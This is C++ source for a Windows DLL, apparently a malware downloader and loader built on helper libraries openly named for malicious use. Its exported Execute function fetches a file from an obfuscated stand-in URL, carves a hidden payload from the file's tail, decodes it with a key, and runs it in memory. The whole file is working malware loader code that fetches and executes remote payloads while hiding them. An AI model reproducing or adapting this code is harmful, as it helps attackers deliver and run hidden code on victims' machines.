#include <Windows.h>

#include "xLibMaliciousApi.h"
#include "xPayloadApi.h"
#include "xOsApi.h"



#define X_EXTERN_DLL_EXPORT		extern "C" __declspec(dllexport)

#define X_DOWNLOAD_URL			X_OBFUSCATED_STRING_W(L"http://domain.ext/obfuscated-payload.ext")



BOOL WINAPI DllMain(_In_ HINSTANCE hinstDLL, _In_ DWORD fdwReason, _In_ LPVOID lpvReserved)
{
	return true;
}

bool GetRealObfuscatedPayload(const uint8_t* download, const size_t downloadSize, uint8_t** obfuscatedPayload, size_t* obfuscatedPayloadSize)
{
	if (!download || !downloadSize || !obfuscatedPayload || !obfuscatedPayloadSize)
	{
		return false;
	}

	uint32_t size;

	X_LIB_MALICIOUS_CALL(xMemoryCopy)(&size, download + (downloadSize - sizeof(size)), sizeof(size));

	uint8_t* temp = (uint8_t*) X_LIB_MALICIOUS_CALL(xMemoryClone)(download + (downloadSize - size - sizeof(size)), size);

	if (temp)
	{
		*obfuscatedPayload = temp;

		*obfuscatedPayloadSize = size;

		return true;
	}

	return false;
}

X_EXTERN_DLL_EXPORT void Execute()
{
	uint8_t* download = NULL;

	size_t downloadSize = 0;

	if (X_LIB_MALICIOUS_CALL(xDownloadToBuffer)(X_DOWNLOAD_URL, &download, &downloadSize))
	{
		uint8_t* obfuscated = NULL;

		size_t obfuscatedSize = 0;

		if (GetRealObfuscatedPayload(download, downloadSize, &obfuscated, &obfuscatedSize))
		{
			uint8_t* payload = NULL;

			size_t payloadSize = 0;

			if (X_LIB_MALICIOUS_CALL(xPayloadGetPayload)("key", obfuscated, obfuscatedSize, &payload, &payloadSize))
			{
				X_PAYLOAD_INIT(payload, payloadSize);

				X_PAYLOAD_CALL(Execute)();

				X_LIB_MALICIOUS_CALL(xMemoryFree)(payload);
			}

			X_LIB_MALICIOUS_CALL(xMemoryFree)(obfuscated);
		}

		X_LIB_MALICIOUS_CALL(xMemoryFree)(download);
	}
}